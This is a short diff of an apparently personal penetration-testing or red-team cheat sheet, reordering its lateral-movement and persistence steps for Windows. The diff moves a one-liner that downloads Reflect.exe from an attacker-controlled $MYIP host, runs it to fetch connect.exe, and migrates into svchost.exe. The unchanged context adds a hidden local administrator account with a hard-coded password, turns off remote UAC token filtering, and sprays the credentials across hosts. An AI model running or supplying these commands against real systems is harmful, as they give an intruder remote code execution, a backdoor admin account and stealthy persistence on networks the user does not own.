@@ -1478,15 +1478,15 @@ jobs
 jobs -k 1
 
 # Lateral Movement: Persistence
+## Establish Shell
+powershell -c curl $MYIP/windows/Reflect.exe -o \windows\tasks\Reflect.exe; \windows\tasks\Reflect.exe http://$MYIP/windows/connect.exe
+migrate -N svchost.exe
+
 ## Create Account
 powershell -c "Invoke-Command -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }"
 
 ## Verify Access
 sprayme 'dbf:123qweasdF!' hosts
-
-## Get Shell
-powershell -c curl $MYIP/windows/Reflect.exe -o \windows\tasks\Reflect.exe; \windows\tasks\Reflect.exe http://$MYIP/windows/connect.exe
-migrate -N svchost.exe
 
 # Lateral Movement: Pivoting
 ## Identify
